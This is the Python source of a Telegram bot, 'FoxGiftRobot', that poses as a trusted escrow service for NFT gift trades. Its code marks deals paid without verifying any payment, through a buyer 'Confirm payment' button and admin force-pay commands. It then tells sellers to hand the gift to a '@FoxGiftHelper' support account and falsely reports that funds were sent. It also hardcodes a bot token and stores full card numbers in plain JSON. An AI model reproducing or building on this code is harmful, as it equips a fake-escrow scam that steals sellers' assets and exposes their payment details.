# FoxGiftRobotUpdate
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import random
import string
from datetime import datetime
import json
import os

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация бота
bot = Bot(token="8233774084:AAGnskBeS-c3Li6AX9Kq2_RcDK2r7uOVJJo")
storage = MemoryStorage()
dp = Dispatcher(storage=storage)


# Класс для хранения данных в JSON
class JSONStorage:
    def __init__(self, filename: str = "data.json"):
        self.filename = filename
        self.data = self._load_data()

    def _load_data(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return {"users": {}, "deals": {}, "payments": {}, "admins": []}
        return {"users": {}, "deals": {}, "payments": {}, "admins": []}

    def _save_data(self):
        try:
            with open(self.filename, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"Error saving data: {e}")

    def get_user_payments(self, user_id: int):
        user_id_str = str(user_id)
        return self.data["payments"].get(user_id_str, [])

    def add_user_payment(self, user_id: int, payment_data: dict):
        user_id_str = str(user_id)
        if user_id_str not in self.data["payments"]:
            self.data["payments"][user_id_str] = []
        self.data["payments"][user_id_str].append(payment_data)
        self._save_data()

    def save_deal(self, deal_id: str, deal_data: dict):
        self.data["deals"][deal_id] = deal_data
        self._save_data()

    def get_deal(self, deal_id: str):
        return self.data["deals"].get(deal_id)

    def update_deal(self, deal_id: str, updates: dict):
        if deal_id in self.data["deals"]:
            self.data["deals"][deal_id].update(updates)
            self._save_data()

    def add_admin(self, user_id: int):
        user_id_str = str(user_id)
        if user_id_str not in self.data["admins"]:
            self.data["admins"].append(user_id_str)
            self._save_data()

    def is_admin(self, user_id: int):
        return str(user_id) in self.data["admins"]


# Инициализация хранилища
storage_db = JSONStorage()


# Генератор ID сделок
def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


# Главное меню
def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Управление реквизитами"), KeyboardButton(text="Создать сделку")],
            [KeyboardButton(text="Реферальная ссылка"), KeyboardButton(text="Change language")],
            [KeyboardButton(text="Поддержка")]
        ],
        resize_keyboard=True,
        input_field_placeholder="Выберите раздел..."
    )


# Состояния для создания сделки
class CreateDeal(StatesGroup):
    entering_name = State()
    entering_nft_link = State()
    choosing_currency = State()
    entering_price = State()
    choosing_payment_method = State()
    confirmation = State()


# Состояния для добавления реквизитов
class AddPaymentMethod(StatesGroup):
    entering_card = State()
    entering_ton = State()
    entering_username = State()


# ========== АДМИН КОМАНДЫ ==========

@dp.message(Command("admin"))
async def admin_command(message: types.Message):
    if not storage_db.is_admin(message.from_user.id):
        await message.answer("❌ У вас нет прав администратора")
        return

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
            [InlineKeyboardButton(text="👥 Добавить админа", callback_data="admin_add")],
            [InlineKeyboardButton(text="🔍 Активные сделки", callback_data="admin_active_deals")],
        ]
    )

    await message.answer("🛠 Панель администратора", reply_markup=keyboard)


@dp.message(Command("addadmin"))
async def add_admin_command(message: types.Message):
    if not storage_db.is_admin(message.from_user.id):
        await message.answer("❌ У вас нет прав администратора")
        return

    try:
        user_id = int(message.text.split()[1])
        storage_db.add_admin(user_id)
        await message.answer(f"✅ Пользователь {user_id} добавлен в администраторы")
    except:
        await message.answer("Использование: /addadmin <user_id>")


@dp.message(Command("force_pay"))
async def force_pay_command(message: types.Message):
    if not storage_db.is_admin(message.from_user.id):
        await message.answer("❌ У вас нет прав администратора")
        return

    try:
        deal_id = message.text.split()[1]
        deal = storage_db.get_deal(deal_id)

        if not deal:
            await message.answer("❌ Сделка не найдена")
            return

        if deal['status'] != 'active':
            await message.answer("❌ Сделка уже завершена или отменена")
            return

        # Обновляем статус сделки как оплаченной
        storage_db.update_deal(deal_id, {
            'status': 'waiting_gift',
            'paid_at': datetime.now().isoformat()
        })

        # Уведомляем продавца
        seller_text = (
            f"💰 **Сделка #{deal_id} оплачена!**\n\n"
            f"**Товар:** {deal['asset_name']}\n"
            f"**Цена:** {deal['price']} {deal['currency']}\n\n"
            f"📦 **Отправьте NFT подарок саппорту для проверки:**\n"
            f"1. Перейдите в @FoxGiftHelper\n"
            f"2. Отправьте NFT подарок\n"
            f"3. Сообщите об этом в поддержку\n\n"
            f"После проверки средства будут переведены вам."
        )

        try:
            await bot.send_message(deal['seller_id'], seller_text)
        except:
            pass

        await message.answer(
            f"✅ Сделка #{deal_id} отмечена как оплаченная. Продавец уведомлен о необходимости отправить подарок.")

    except IndexError:
        await message.answer("Использование: /force_pay <deal_id>")


@dp.callback_query(F.data == "admin_active_deals")
async def admin_active_deals(callback: types.CallbackQuery):
    if not storage_db.is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав администратора")
        return

    active_deals = []
    for deal_id, deal in storage_db.data["deals"].items():
        if deal.get('status') == 'active':
            active_deals.append(deal)

    if not active_deals:
        await callback.message.answer("📊 Нет активных сделок")
        return

    deals_text = "📊 **Активные сделки:**\n\n"
    for deal in active_deals[:10]:  # Показываем первые 10
        deals_text += f"#{deal['deal_id']} - {deal['asset_name']}\n"
        deals_text += f"Цена: {deal['price']} {deal['currency']}\n"
        deals_text += f"Продавец: @{deal['seller_username'] or 'No username'}\n"
        deals_text += f"---\n"

    await callback.message.answer(deals_text)


# ========== ДОПОЛНИТЕЛЬНЫЕ АДМИН КОМАНДЫ ==========

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if not storage_db.is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав администратора")
        return

    total_deals = len(storage_db.data["deals"])
    active_deals = len([d for d in storage_db.data["deals"].values() if d.get('status') == 'active'])
    waiting_gift = len([d for d in storage_db.data["deals"].values() if d.get('status') == 'waiting_gift'])
    completed_deals = len([d for d in storage_db.data["deals"].values() if d.get('status') == 'completed'])
    total_users = len(storage_db.data["payments"])

    stats_text = (
        "📊 **Статистика FoxGiftRobot**\n\n"
        f"👥 Всего пользователей: {total_users}\n"
        f"📦 Всего сделок: {total_deals}\n"
        f"🟢 Активных сделок: {active_deals}\n"
        f"⏳ Ожидают подарка: {waiting_gift}\n"
        f"✅ Завершённых: {completed_deals}\n"
        f"👑 Админов: {len(storage_db.data['admins'])}"
    )

    await callback.message.edit_text(stats_text)


@dp.callback_query(F.data == "admin_add")
async def admin_add_info(callback: types.CallbackQuery):
    if not storage_db.is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав администратора")
        return

    await callback.message.edit_text(
        "👥 **Добавление администратора**\n\n"
        "Используйте команду:\n"
        "`/addadmin <user_id>`\n\n"
        "Пример:\n"
        "`/addadmin 123456789`\n\n"
        "Чтобы узнать user_id пользователя, можно использовать @userinfobot"
    )


@dp.message(Command("complete_deal"))
async def complete_deal_command(message: types.Message):
    if not storage_db.is_admin(message.from_user.id):
        await message.answer("❌ У вас нет прав администратора")
        return

    try:
        deal_id = message.text.split()[1]
        deal = storage_db.get_deal(deal_id)

        if not deal:
            await message.answer("❌ Сделка не найдена")
            return

        if deal['status'] != 'waiting_gift':
            await message.answer("❌ Сделка не в статусе ожидания подарка")
            return

        # Завершаем сделку
        storage_db.update_deal(deal_id, {
            'status': 'completed',
            'completed_at': datetime.now().isoformat(),
            'completed_by': message.from_user.id
        })

        # Уведомляем продавца
        seller_text = (
            f"🎉 **Сделка #{deal_id} завершена!**\n\n"
            f"**Товар:** {deal['asset_name']}\n"
            f"**Цена:** {deal['price']} {deal['currency']}\n"
            f"**Статус:** Подарок проверен и передан покупателю\n\n"
            f"💸 Средства переведены на ваш реквизит."
        )

        try:
            await bot.send_message(deal['seller_id'], seller_text)
        except:
            pass

        # Уведомляем покупателя
        if 'buyer_id' in deal:
            buyer_text = (
                f"🎁 **Сделка #{deal_id} завершена!**\n\n"
                f"**Товар:** {deal['asset_name']}\n"
                f"**Статус:** Подарок проверен и передан вам\n\n"
                f"Наслаждайтесь покупкой!"
            )
            try:
                await bot.send_message(deal['buyer_id'], buyer_text)
            except:
                pass

        await message.answer(f"✅ Сделка #{deal_id} завершена. Все участники уведомлены.")

    except IndexError:
        await message.answer("Использование: /complete_deal <deal_id>")


@dp.message(Command("cancel_deal"))
async def cancel_deal_command(message: types.Message):
    if not storage_db.is_admin(message.from_user.id):
        await message.answer("❌ У вас нет прав администратора")
        return

    try:
        deal_id = message.text.split()[1]
        deal = storage_db.get_deal(deal_id)

        if not deal:
            await message.answer("❌ Сделка не найдена")
            return

        # Отменяем сделку
        storage_db.update_deal(deal_id, {
            'status': 'cancelled',
            'cancelled_at': datetime.now().isoformat(),
            'cancelled_by': message.from_user.id
        })

        # Уведомляем продавца
        seller_text = (
            f"❌ **Сделка #{deal_id} отменена администратором**\n\n"
            f"**Товар:** {deal['asset_name']}\n"
            f"**Причина:** Администратор отменил сделку"
        )

        try:
            await bot.send_message(deal['seller_id'], seller_text)
        except:
            pass

        # Уведомляем покупателя если есть
        if 'buyer_id' in deal:
            buyer_text = (
                f"❌ **Сделка #{deal_id} отменена**\n\n"
                f"**Товар:** {deal['asset_name']}\n"
                f"**Причина:** Администратор отменил сделку"
            )
            try:
                await bot.send_message(deal['buyer_id'], buyer_text)
            except:
                pass

        await message.answer(f"✅ Сделка #{deal_id} отменена. Все участники уведомлены.")

    except IndexError:
        await message.answer("Использование: /cancel_deal <deal_id>")


# ========== ОБРАБОТЧИКИ КОМАНД ==========

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Обработка ссылок на сделки
    if len(message.text.split()) > 1:
        deal_id = message.text.split()[1]
        await show_deal_to_buyer(message, deal_id)
        return

    welcome_text = """Добро пожаловать в FoxGift – надежный P2P-гарант

Покупайте и продавайте NFT – безопасно!
Сделки проходят легко и без риска.

✅ Удобное управление кошельками
✅ Реферальная система  
✅ Безопасные сделки с гарантией

Выберите нужный раздел ниже:"""

    await message.answer(welcome_text, reply_markup=get_main_keyboard())


# ========== УПРАВЛЕНИЕ РЕКВИЗИТАМИ ==========

def get_payment_management_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
            [InlineKeyboardButton(text="🟨 Добавить TON кошелек", callback_data="add_ton")],
            [InlineKeyboardButton(text="⭐ Добавить юзернейм для Stars", callback_data="add_username")],
            [InlineKeyboardButton(text="📋 Мои реквизиты", callback_data="my_payments")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
        ]
    )


@dp.message(F.text == "Управление реквизитами")
async def manage_payments(message: types.Message):
    await message.answer(
        "💳 **Управление реквизитами**\n\n"
        "Добавьте способы получения платежей:",
        reply_markup=get_payment_management_keyboard()
    )


@dp.callback_query(F.data == "add_card")
async def add_card(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "💳 **Добавление банковской карты**\n\n"
        "Введите номер банковской карты:\n\n"
        "Пример: `2200 1234 5678 9012`",
        parse_mode="Markdown"
    )
    await state.set_state(AddPaymentMethod.entering_card)


@dp.message(AddPaymentMethod.entering_card)
async def process_card_number(message: types.Message, state: FSMContext):
    card_number = message.text.replace(" ", "")

    if not card_number.isdigit() or len(card_number) not in [16, 18]:
        await message.answer(
            "❌ Неверный формат номера карты. Должно быть 16 или 18 цифр.\n"
            "Попробуйте снова:"
        )
        return

    masked_card = f"{card_number[:4]} {card_number[4:6]}** **** {card_number[-4:]}"

    storage_db.add_user_payment(message.from_user.id, {
        'type': 'Банковская карта',
        'details': card_number,
        'masked': masked_card,
        'name': 'Карта'
    })

    await message.answer(
        f"✅ **Карта успешно добавлена!**\n\n"
        f"**Реквизиты:** `{masked_card}`",
        parse_mode="Markdown",
        reply_markup=get_payment_management_keyboard()
    )
    await state.clear()


@dp.callback_query(F.data == "add_ton")
async def add_ton(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "🟨 **Добавление TON кошелька**\n\n"
        "Введите адрес вашего TON кошелька:\n\n"
        "Пример: `UQABCDEF1234567890abcdefghijklmnopqrstuvwxyz`",
        parse_mode="Markdown"
    )
    await state.set_state(AddPaymentMethod.entering_ton)


@dp.message(AddPaymentMethod.entering_ton)
async def process_ton_wallet(message: types.Message, state: FSMContext):
    ton_wallet = message.text.strip()

    if not ton_wallet.startswith('UQ') or len(ton_wallet) < 20:
        await message.answer(
            "❌ Неверный формат TON кошелька. Должен начинаться с UQ.\n"
            "Попробуйте снова:"
        )
        return

    masked_ton = f"{ton_wallet[:5]}...{ton_wallet[-3:]}" if len(ton_wallet) > 8 else ton_wallet

    storage_db.add_user_payment(message.from_user.id, {
        'type': 'TON кошелек',
        'details': ton_wallet,
        'masked': masked_ton,
        'name': 'TON Кошелек'
    })

    await message.answer(
        f"✅ **TON кошелек успешно добавлен!**\n\n"
        f"**Реквизиты:** `{masked_ton}`",
        parse_mode="Markdown",
        reply_markup=get_payment_management_keyboard()
    )
    await state.clear()


@dp.callback_query(F.data == "add_username")
async def add_username(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "⭐ **Добавление юзернейма для Telegram Stars**\n\n"
        "Введите ваш юзернейм (без @):\n\n"
        "Пример: `ivan_ivanov`",
        parse_mode="Markdown"
    )
    await state.set_state(AddPaymentMethod.entering_username)


@dp.message(AddPaymentMethod.entering_username)
async def process_username(message: types.Message, state: FSMContext):
    username = message.text.strip().replace('@', '')

    if len(username) < 3:
        await message.answer(
            "❌ Слишком короткий юзернейм.\n"
            "Попробуйте снова:"
        )
        return

    storage_db.add_user_payment(message.from_user.id, {
        'type': 'Telegram Stars',
        'details': username,
        'masked': f"@{username}",
        'name': 'Stars'
    })

    await message.answer(
        f"✅ **Юзернейм для Stars успешно добавлен!**\n\n"
        f"**Реквизиты:** @{username}\n\n"
        f"Покупатели смогут отправлять Stars на этот юзернейм.",
        parse_mode="Markdown",
        reply_markup=get_payment_management_keyboard()
    )
    await state.clear()


@dp.callback_query(F.data == "my_payments")
async def show_my_payments(callback: types.CallbackQuery):
    payments = storage_db.get_user_payments(callback.from_user.id)

    if not payments:
        await callback.message.edit_text(
            "📋 **Мои реквизиты**\n\n"
            "У вас пока нет добавленных реквизитов",
            reply_markup=get_payment_management_keyboard()
        )
        return

    payment_text = "📋 **Ваши реквизиты:**\n\n"
    for i, payment in enumerate(payments, 1):
        payment_text += f"{i}. **{payment['name']}** ({payment['type']})\n"
        payment_text += f"   `{payment['masked']}`\n\n"

    await callback.message.edit_text(
        payment_text,
        parse_mode="Markdown",
        reply_markup=get_payment_management_keyboard()
    )


# ========== СОЗДАНИЕ СДЕЛКИ ==========

def get_currency_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="RUB", callback_data="currency_rub")],
            [InlineKeyboardButton(text="⭐ Telegram Stars", callback_data="currency_stars")],
            [InlineKeyboardButton(text="🟨 TON", callback_data="currency_ton")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
        ]
    )


@dp.message(F.text == "Создать сделку")
async def create_deal_start(message: types.Message, state: FSMContext):
    await message.answer(
        "🖼 **Создание NFT сделки**\n\n"
        "📝 Введите название NFT:\n\n"
        "Пример: `Light Sword`",
        parse_mode="Markdown"
    )
    await state.set_state(CreateDeal.entering_name)


@dp.message(CreateDeal.entering_name)
async def process_deal_name(message: types.Message, state: FSMContext):
    await state.update_data(asset_name=message.text, asset_type="NFT")

    await message.answer(
        "🔗 **Отправьте ссылку на NFT:**\n\n"
        "Пример: `https://getgems.io/collection/EQ1234567890abcdef/nft/123`"
    )
    await state.set_state(CreateDeal.entering_nft_link)


@dp.message(CreateDeal.entering_nft_link)
async def process_nft_link(message: types.Message, state: FSMContext):
    await state.update_data(nft_link=message.text)

    await message.answer(
        "💰 **Выберите валюту для оплаты:**",
        reply_markup=get_currency_keyboard()
    )
    await state.set_state(CreateDeal.choosing_currency)


@dp.callback_query(CreateDeal.choosing_currency, F.data.startswith("currency_"))
async def choose_currency(callback: types.CallbackQuery, state: FSMContext):
    currencies = {
        "currency_rub": "RUB",
        "currency_stars": "Stars",
        "currency_ton": "TON"
    }

    currency = currencies[callback.data]
    await state.update_data(currency=currency)

    if currency == "Stars":
        await callback.message.edit_text(
            "⭐ **Создание сделки за Telegram Stars**\n\n"
            "Введите сумму Stars сделки в формате: 100"
        )
    elif currency == "TON":
        await callback.message.edit_text(
            "🟨 **Создание сделки за TON**\n\n"
            "Введите сумму в TON:\n\n"
            "Пример: `10` или `5.5`"
        )
    else:
        await callback.message.edit_text(
            f"💰 **Укажите цену товара в {currency}:**\n\n"
            f"Пример: `1400` или `1400.0`"
        )
    await state.set_state(CreateDeal.entering_price)


@dp.message(CreateDeal.entering_price)
async def process_deal_price(message: types.Message, state: FSMContext):
    try:
        price = float(message.text)
        await state.update_data(price=price)

        data = await state.get_data()
        currency = data['currency']

        # Получаем подходящие реквизиты пользователя
        user_payments = storage_db.get_user_payments(message.from_user.id)

        suitable_payments = []
        if currency == "RUB":
            suitable_payments = [p for p in user_payments if p['type'] == 'Банковская карта']
        elif currency == "Stars":
            suitable_payments = [p for p in user_payments if p['type'] == 'Telegram Stars']
        elif currency == "TON":
            suitable_payments = [p for p in user_payments if p['type'] == 'TON кошелек']

        if not suitable_payments:
            await message.answer(
                f"⚠️ **У вас нет подходящих реквизитов для валюты {currency}!**\n\n"
                f"Добавьте реквизиты в разделе 'Управление реквизитами'",
                reply_markup=get_main_keyboard()
            )
            await state.clear()
            return

        # Создаем клавиатуру выбора реквизита
        keyboard = InlineKeyboardMarkup(inline_keyboard=[])
        for payment in suitable_payments:
            keyboard.inline_keyboard.append([
                InlineKeyboardButton(
                    text=f"{payment['name']} ({payment['masked']})",
                    callback_data=f"payment_{suitable_payments.index(payment)}"
                )
            ])
        keyboard.inline_keyboard.append([InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_currency")])

        await message.answer(
            "💳 **Выберите реквизит для получения платежа:**",
            reply_markup=keyboard
        )
        await state.set_state(CreateDeal.choosing_payment_method)

    except ValueError:
        await message.answer("❌ Неверный формат цены. Введите число:")


@dp.callback_query(CreateDeal.choosing_payment_method, F.data.startswith("payment_"))
async def choose_payment_method(callback: types.CallbackQuery, state: FSMContext):
    payment_index = int(callback.data.replace("payment_", ""))
    user_payments = storage_db.get_user_payments(callback.from_user.id)

    selected_payment = user_payments[payment_index]
    await state.update_data(
        payment_details=selected_payment['details'],
        payment_masked=selected_payment['masked'],
        payment_type=selected_payment['type']
    )

    # Получаем все данные сделки
    data = await state.get_data()

    # Генерируем ID сделки
    deal_id = generate_deal_id()

    # Сохраняем сделку
    deal_data = {
        **data,
        'deal_id': deal_id,
        'seller_id': callback.from_user.id,
        'seller_username': callback.from_user.username,
        'status': 'active',
        'created_at': datetime.now().isoformat()
    }

    storage_db.save_deal(deal_id, deal_data)

    # Создаем ссылку для покупки
    bot_username = (await bot.get_me()).username
    deal_link = f"https://t.me/{bot_username}?start={deal_id}"

    # Формируем подтверждение
    confirmation_text = (
        "✅ **Сделка создана!**\n\n"
        f"**Номер сделки:** #{deal_id}\n"
        f"**Товар:** {data['asset_name']}\n"
        f"**Ссылка на NFT:** {data['nft_link']}\n"
        f"**Цена:** {data['price']} {data['currency']}\n"
        f"**Способ оплаты:** {selected_payment['type']}\n\n"
        f"🔗 **Ссылка для покупателя:**\n"
        f"`{deal_link}`\n\n"
        f"Поделитесь этой ссылкой с покупателем!"
    )

    await callback.message.edit_text(confirmation_text, parse_mode="Markdown")
    await state.clear()


# ========== ПОКУПКА СДЕЛКИ ==========

async def show_deal_to_buyer(message: types.Message, deal_id: str):
    deal = storage_db.get_deal(deal_id)

    if not deal:
        await message.answer("❌ Сделка не найдена")
        return

    # Проверяем, не является ли пользователь продавцом этой сделки
    if deal['seller_id'] == message.from_user.id:
        await message.answer(
            "❌ **Вы не можете покупать в своей же сделке!**\n\n"
            "Эта сделка создана вами. Поделитесь ссылкой с покупателем."
        )
        return

    if deal['status'] != 'active':
        await message.answer("❌ Эта сделка уже завершена или отменена")
        return

    # Формируем информацию о сделке для покупателя
    deal_text = (
        f"# Deal information #{deal_id}\n\n"
        f"- You are the buyer in the deal.\n"
        f"- Seller: @{deal['seller_username'] or 'No username'}\n"
        f"- Successful deals: 0\n\n"
        f"- You are buying: {deal['asset_name']}\n"
        f"- NFT Link: {deal['nft_link']}\n\n"
    )

    if deal['currency'] == 'RUB' and deal['payment_type'] == 'Банковская карта':
        deal_text += (
            f"Payment address:  \n"
            f"`{deal['payment_details']}`  \n\n"
            f"Amount to pay: {deal['price']} {deal['currency']}  \n"
            f"Payment comment(memo): {deal_id}  \n\n"
            f"Please verify the details before payment. The comment(memo) is mandatory!\n\n"
            f"If you sent a transaction without a comment, fill out the form —  \n"
            f"@FoxGiftHelper"
        )
    elif deal['currency'] == 'Stars':
        deal_text += (
            f"⭐ **Сделка за Telegram Stars**\n\n"
            f"Send Stars to: @{deal['payment_details']}\n"
            f"Amount to pay: {deal['price']} Stars\n\n"
            f"После оплаты подтвердите платеж кнопкой ниже"
        )
    elif deal['currency'] == 'TON':
        deal_text += (
            f"🟨 **Сделка за TON**\n\n"
            f"Payment address:  \n"
            f"`{deal['payment_details']}`  \n\n"
            f"Amount to pay: {deal['price']} TON\n"
            f"Payment comment(memo): {deal_id}  \n\n"
            f"Please verify the details before payment."
        )

    keyboard_buttons = [
        [InlineKeyboardButton(text="💬 Confirm payment", callback_data=f"confirm_pay_{deal_id}")],
        [InlineKeyboardButton(text="💬 Exit deal", callback_data="exit_deal")]
    ]

    # Добавляем кнопку админа для принудительной оплаты
    if storage_db.is_admin(message.from_user.id):
        keyboard_buttons.append(
            [InlineKeyboardButton(text="🛠 Admin: Force Pay", callback_data=f"admin_force_{deal_id}")])

    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)

    await message.answer(deal_text, reply_markup=keyboard, parse_mode="Markdown")


# Блокируем прямой доступ через команду /deal
@dp.message(Command("deal"))
async def deal_command_blocked(message: types.Message):
    await message.answer(
        "❌ **Доступ через команду запрещен**\n\n"
        "Для покупки используйте ссылку, которую предоставил продавец.\n"
        "Если у вас есть номер сделки, перейдите по ссылке:\n"
        f"https://t.me/{(await bot.get_me()).username}?start=DEAL_ID\n\n"
        "Замените DEAL_ID на номер вашей сделки."
    )


# Обработчик подтверждения оплаты покупателем
@dp.callback_query(F.data.startswith("confirm_pay_"))
async def confirm_payment(callback: types.CallbackQuery):
    deal_id = callback.data.replace("confirm_pay_", "")
    deal = storage_db.get_deal(deal_id)

    if not deal:
        await callback.answer("❌ Сделка не найдена")
        return

    if deal['status'] != 'active':
        await callback.answer("❌ Сделка уже завершена")
        return

    # Обновляем статус сделки
    storage_db.update_deal(deal_id, {
        'status': 'waiting_gift',
        'buyer_id': callback.from_user.id,
        'buyer_username': callback.from_user.username,
        'paid_at': datetime.now().isoformat()
    })

    # Уведомляем продавца
    seller_text = (
        f"💰 **Сделка #{deal_id} оплачена покупателем!**\n\n"
        f"**Товар:** {deal['asset_name']}\n"
        f"**Цена:** {deal['price']} {deal['currency']}\n"
        f"**Покупатель:** @{callback.from_user.username or 'No username'}\n\n"
        f"📦 **Отправьте NFT подарок саппорту для проверки:**\n"
        f"1. Перейдите в @FoxGiftHelper\n"
        f"2. Отправьте NFT подарок\n"
        f"3. Сообщите об этом в поддержку\n\n"
        f"После проверки средства будут переведены вам."
    )

    try:
        await bot.send_message(deal['seller_id'], seller_text)
    except:
        pass

    await callback.message.edit_text(
        f"✅ **Оплата подтверждена!**\n\n"
        f"Сделка #{deal_id} переведена в статус ожидания передачи товара.\n"
        f"Продавец уведомлен о необходимости отправить подарок саппорту для проверки."
    )


# Обработчик принудительной оплаты админом
@dp.callback_query(F.data.startswith("admin_force_"))
async def admin_force_pay(callback: types.CallbackQuery):
    if not storage_db.is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав администратора")
        return

    deal_id = callback.data.replace("admin_force_", "")
    deal = storage_db.get_deal(deal_id)

    if not deal:
        await callback.answer("❌ Сделка не найдена")
        return

    if deal['status'] != 'active':
        await callback.answer("❌ Сделка уже завершена")
        return

    # Обновляем статус сделки
    storage_db.update_deal(deal_id, {
        'status': 'waiting_gift',
        'paid_at': datetime.now().isoformat()
    })

    # Уведомляем продавца
    seller_text = (
        f"💰 **Сделка #{deal_id} оплачена!**\n\n"
        f"**Товар:** {deal['asset_name']}\n"
        f"**Цена:** {deal['price']} {deal['currency']}\n\n"
        f"📦 **Отправьте NFT подарок саппорту для проверки:**\n"
        f"1. Перейдите в @FoxGiftHelper\n"
        f"2. Отправьте NFT подарок\n"
        f"3. Сообщите об этом в поддержку\n\n"
        f"После проверки средства будут переведены вам."
    )

    try:
        await bot.send_message(deal['seller_id'], seller_text)
    except:
        pass

    await callback.message.edit_text(
        f"✅ **Сделка #{deal_id} отмечена как оплаченная**\n\n"
        f"Продавец уведомлен о необходимости отправить подарок саппорту для проверки."
    )


# Обработчик для кнопки "Exit deal"
@dp.callback_query(F.data == "exit_deal")
async def exit_deal(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "❌ **Сделка отменена**\n\n"
        "Вы вышли из сделки."
    )


# ========== ОБРАБОТЧИКИ КНОПОК НАЗАД ==========

@dp.callback_query(F.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.delete()
    await cmd_start(callback.message)


@dp.callback_query(F.data == "back_to_currency")
async def back_to_currency(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "💰 **Выберите валюту для оплаты:**",
        reply_markup=get_currency_keyboard()
    )
    await state.set_state(CreateDeal.choosing_currency)


# ========== ДРУГИЕ РАЗДЕЛЫ ==========

@dp.message(F.text == "Реферальная ссылка")
async def referral_link(message: types.Message):
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{message.from_user.id}"
    await message.answer(
        f"👥 **Реферальная система**\n\n"
        f"Ваша ссылка:\n`{ref_link}`\n\n"
        f"Приглашайте друзей и получайте бонусы!",
        parse_mode="Markdown"
    )


@dp.message(F.text == "Change language")
async def change_language(message: types.Message):
    await message.answer("🌍 Выберите язык / Select language:")


@dp.message(F.text == "Поддержка")
async def support(message: types.Message):
    await message.answer(
        "🛟 **Служба поддержки**\n\n"
        "По всем вопросам обращайтесь:\n"
        "👉 @FoxGiftHelper\n"
    )


# ========== ЗАПУСК БОТА ==========

async def main():
    logger.info("Бот запускается...")
    # Добавляем первого админа (замените на ваш ID)
    storage_db.add_admin(6016995687)  # Ваш user_id
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())